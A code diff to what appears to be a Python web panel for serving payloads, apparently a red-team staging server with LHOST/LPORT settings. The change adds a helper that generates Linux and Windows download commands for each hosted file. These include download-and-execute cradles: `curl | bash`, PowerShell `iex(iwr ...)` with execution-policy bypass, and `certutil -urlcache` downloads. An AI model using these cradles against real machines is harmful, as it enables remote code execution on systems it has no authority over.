@@ -677,6 +677,9 @@ align-items:center;justify-content:space-between;transition:border-color .15s}
 .file-card .fname{font-weight:600;font-size:13px;color:var(--accent)}
 .file-card .fsize{color:var(--text2);font-size:12px}
 .file-card .fcmd{font-size:11px;color:var(--text2);word-break:break-all}
+.file-card .fcmd-os{display:inline-block;min-width:34px;margin-right:4px;padding:0 4px;
+border:1px solid var(--border);border-radius:3px;font-size:9px;text-transform:uppercase;
+color:var(--accent);text-align:center}
 .file-card .actions{display:flex;gap:6px;margin-left:12px;flex-shrink:0}
 
 .btn{display:inline-flex;align-items:center;gap:5px;padding:5px 12px;border-radius:4px;
@@ -1599,6 +1602,23 @@ document.querySelectorAll('#md-target table').forEach(t=>{{const w=document.crea
     return _base_html(name, body, active=section)
 
 
+def _dl_cmds(base: str, name: str) -> tuple[str, list[str]]:
+    """Comandi di download suggeriti per un file: (linux, [windows...])."""
+    if name.endswith(".sh"):
+        lin = f"curl {base}/{name} | bash"
+    elif name.endswith(".exe"):
+        lin = f"curl {base}/{name} -o {name}"
+    else:
+        lin = f"curl {base}/{name} -o {name} && chmod +x {name}"
+    if name.endswith(".ps1"):
+        win = [f'powershell -ep bypass -c "iex(iwr {base}/{name} -UseBasicParsing)"',
+               f'powershell -ep bypass -c "iwr {base}/{name} -OutFile {name}"']
+    else:
+        win = [f'powershell -ep bypass -c "iwr {base}/{name} -OutFile {name}"',
+               f"certutil -urlcache -split -f {base}/{name} {name}"]
+    return lin, win
+
+
 def _page_static_list() -> str:
     files = []
     if STATIC_ROOT.is_dir():
@@ -1620,15 +1640,13 @@ def _page_static_list() -> str:
         else:
             label = f"{size} B"
         name = f.name
-        if name.endswith(".sh"):
-            cmd = f"curl {base}/{name} | bash"
-        elif name.endswith(".exe"):
-            cmd = f"curl {base}/{name} -o {name}"
-        else:
-            cmd = f"curl {base}/{name} -o {name} && chmod +x {name}"
+        cmd, win_cmds = _dl_cmds(base, name)
         ename = html.escape(name)
+        win_html = "".join(
+            f'<div class="fcmd"><span class="fcmd-os">win</span> {html.escape(w)}</div>'
+            for w in win_cmds)
         cards += f"""<div class="file-card">
-<div style="min-width:0;flex:1"><div class="fname">{ename}</div><div class="fcmd">{html.escape(cmd)}</div></div>
+<div style="min-width:0;flex:1"><div class="fname">{ename}</div><div class="fcmd"><span class="fcmd-os">linux</span> {html.escape(cmd)}</div>{win_html}</div>
 <div class="fsize" style="margin:0 12px">{label}</div>
 <div class="actions">
 <a class="btn" href="/static/edit/{ename}">Apri</a>
@@ -4367,13 +4385,16 @@ wsUpdate();
             cmd = f"curl {base}/{name} -o {name}"
         else:
             cmd = f"curl {base}/{name} -o {name} &amp;&amp; chmod +x {name}"
+        _, win_cmds = _dl_cmds(base, name)
+        win_html = "<br>".join(f"<code>{html.escape(w)}</code>" for w in win_cmds)
         file_rows += f"""<tr>
 <td class="dc-fname">{html.escape(name)}</td>
 <td class="dc-fsize">{label}</td>
-<td class="dc-fcmd"><code>{cmd}</code></td></tr>\n"""
+<td class="dc-fcmd"><code>{cmd}</code></td>
+<td class="dc-fcmd">{win_html}</td></tr>\n"""
 
     if not file_rows:
-        file_rows = '<tr><td colspan="3" style="text-align:center;color:var(--text2);padding:20px">Nessun file in static/</td></tr>'
+        file_rows = '<tr><td colspan="4" style="text-align:center;color:var(--text2);padding:20px">Nessun file in static/</td></tr>'
 
     lport_info = (
         f'LHOST: <code>{html.escape(_lhost or "?")}</code> &nbsp;|&nbsp; '
@@ -4397,7 +4418,7 @@ wsUpdate();
 <h3 style="margin:24px 0 12px;color:var(--text)">File statici ({len(files)})</h3>
 <div class="table-scroll">
 <table class="log-table" style="font-size:13px">
-<thead><tr><th>File</th><th style="width:80px">Size</th><th>Comando</th></tr></thead>
+<thead><tr><th>File</th><th style="width:80px">Size</th><th>Linux</th><th>Windows</th></tr></thead>
 <tbody>{file_rows}</tbody>
 </table>
 </div>
